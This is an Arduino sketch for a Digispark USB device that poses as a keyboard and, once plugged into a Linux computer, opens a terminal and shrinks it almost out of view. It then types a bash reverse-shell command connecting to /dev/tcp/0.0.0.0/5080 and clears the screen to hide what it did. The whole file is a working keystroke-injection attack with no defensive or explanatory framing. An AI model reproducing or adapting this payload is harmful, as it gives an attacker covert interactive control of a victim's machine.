
#include "DigiKeyboard.h"
#define KEY_UP_ARROW 0x52
#define KEY_DOWN_ARROW 0x51
#define KEY_LEFT_ARROW 0x50
#define KEY_RIGHT_ARROW 0x4F


void setup() {
  // put your setup code here, to run once:
   DigiKeyboard.delay(1000); // 1s delay

   // open terminal
   DigiKeyboard.sendKeyStroke(KEY_T, MOD_ALT_RIGHT | MOD_CONTROL_LEFT); 
    DigiKeyboard.delay(500);
   // reduce terminal size
   DigiKeyboard.sendKeyStroke(KEY_F8, MOD_ALT_RIGHT);
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_UP_ARROW);
   
   for (int i = 1; i< 100; i++) {
    DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);
  }
   DigiKeyboard.sendKeyStroke(KEY_RIGHT_ARROW);
   for (int i = 1; i< 100; i++) {
    DigiKeyboard.sendKeyStroke(KEY_LEFT_ARROW);
  }
  
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  

    
   
   
   //delay 2 seconds
   DigiKeyboard.delay(200);

   //type reverse shell

   DigiKeyboard.println("bash -c 'bash -i >& /dev/tcp/0.0.0.0/5080 0>&1' & ");
   DigiKeyboard.println("clear");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.println("clear");
}

void
loop() {
  // put your main code here, to run repeatedly:

}
